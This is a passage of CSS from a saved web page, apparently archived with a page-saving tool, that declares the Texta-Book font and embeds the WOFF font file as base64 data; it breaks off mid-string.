    src: /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Book/Texta-Book.eot?#iefix*/ url() format('embedded-opentype'), /* IE6-IE8 */
         /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Book/Texta-Book.woff*/ url(data:application/font-woff;base64,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